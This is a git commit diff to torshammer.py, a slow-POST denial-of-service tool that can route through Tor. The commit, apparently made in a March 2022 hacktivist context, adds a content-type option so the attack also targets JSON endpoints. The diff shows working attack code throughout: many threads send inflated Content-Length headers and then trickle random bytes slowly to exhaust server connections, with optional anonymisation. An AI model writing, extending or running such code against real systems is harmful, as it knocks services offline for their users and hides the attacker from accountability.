9fa84743fd052128fca218f66c9b1464f0f431e9
Fuck Russian Warship <100783468+fckwarship@users.noreply.github.com>
2022-03-09 00:04:36 +0100

    Add content-type cli parameter

--- torshammer.py
+++ torshammer.py
@@ -19,6 +19,8 @@ from threading import Thread
 
 stop_now = False
 live_connections = 0
+json_prefix = '{"a":"'
+json_postfix = '"}'
 
 def get_useragent_list():
 	with open('user-agents.txt') as f:
@@ -27,10 +29,11 @@ def get_useragent_list():
 useragents = get_useragent_list()
 
 class HttpPostThread(Thread):
-    def __init__(self, thread_id, target, tor):
+    def __init__(self, thread_id, target, content_type, tor):
         Thread.__init__(self)
         self.thread_id = thread_id
         self.tor = tor
+        self.content_type = content_type
         self.transport = None
         self.running = True
         url = urlparse(target)
@@ -52,34 +55,42 @@ class HttpPostThread(Thread):
         return err.msg if hasattr(err, 'msg') else f'{err.errno} {err.strerror}'
 
     def _send_http_post(self):
-        global stop_now
         global live_connections
 
-        payload_length = random.randint(5000, 10000)
+        dynamic_payload_length = random.randint(5000, 10000)
+        total_payload_length = dynamic_payload_length + len(json_prefix) + len(json_postfix) if self.content_type == 'application/json' else dynamic_payload_length
         headers_list = [
             f'POST {self.path} HTTP/1.1',
             f'Host: {self.host}',
             f'User-Agent: {random.choice(useragents)}',
+            'Accept: */*',
+            f'Content-Type: {self.content_type}',
+            f'Content-Length: {total_payload_length}',
             'Connection: keep-alive',
             'Keep-Alive: timeout=900, max=1000',
-            f'Content-Length: {payload_length}',
-            'Content-Type: application/x-www-form-urlencoded',
         ]
-        headers = '\r\n'.join(headers_list)
+        headers = '\n'.join(headers_list)
         self.transport.send(headers.encode())
-        self.transport.send(b'\r\n\r\n')
+        self.transport.send(b'\n\n')
         self._log(f'Sent headers:\n{headers}\n')
 
-        for i in range(0, payload_length - 1):
+        if self.content_type == 'application/json':
+            # self._log(f'Sending {json_prefix}')
+            self.transport.send(json_prefix.encode())
+        for i in range(0, dynamic_payload_length):
             if stop_now:
                 self.running = False
                 break
             p = random.choice(string.ascii_letters + string.digits)
-            self._log(f'Posting byte {i + 1} out of {payload_length}: {p}')
+            # self._log(f'Sending: {p} ({i + 1}/{dynamic_payload_length})')
             self.transport.send(p.encode())
             time.sleep(random.uniform(0.5, 4))
+        if self.content_type == 'application/json':
+            # self._log(f'Sending {json_postfix}')
+            self.transport.send(json_postfix.encode())
 
-        self.transport.close()
+        chunk = self.transport.recv(4096)
+        self._log(f'Received:\n{chunk.decode()}')
 
     def _connect(self):
         self.socket.connect((self.host, self.port))
@@ -104,6 +115,7 @@ class HttpPostThread(Thread):
                     self._send_http_post()
                 except Exception as e:
                     self._log(f'Connection closed, error: {self._format_error_message(e)}. Restarting...')
+                    self.transport.close()
                     self._init_socket()
                     time.sleep(1)
                     break
@@ -113,6 +125,7 @@ class HttpPostThread(Thread):
 def usage():
     print('./torshammer.py -t <target> [-r <threads> -T -h]')
     print(' -t|--target <URL including protocol, host and path>')
+    print(' -c|--content-type <Value of Content-Type header> Defaults to application/x-www-form-urlencoded')
     print(' -r|--threads <Number of threads> Defaults to 256')
     print(' -T|--tor Enable anonymising through tor on 127.0.0.1:9150')
     print(' -h|--help Shows this help\n')
@@ -120,7 +133,7 @@ def usage():
 
 def main(argv):
     try:
-        opts, args = getopt.getopt(argv, 'hTt:r:', ['help', 'tor', 'target=', 'threads='])
+        opts, args = getopt.getopt(argv, 'hTt:c:r:', ['help', 'tor', 'target=', 'content-type=', 'threads='])
     except getopt.GetoptError:
         usage()
         sys.exit(-1)
@@ -128,6 +141,7 @@ def main(argv):
     global stop_now
 
     target = ''
+    content_type = 'application/x-www-form-urlencoded'
     threads = 256
     tor = False
 
@@ -139,6 +153,8 @@ def main(argv):
             tor = True
         elif o in ('-t', '--target'):
             target = a
+        elif o in ('-c', '--content-type'):
+            content_type = a
         elif o in ('-r', '--threads'):
             threads = int(a)
 
@@ -152,7 +168,7 @@ def main(argv):
 
     rthreads = []
     for i in range(threads):
-        t = HttpPostThread(i, target, tor)
+        t = HttpPostThread(i, target, content_type, tor)
         rthreads.append(t)
         t.start()
 
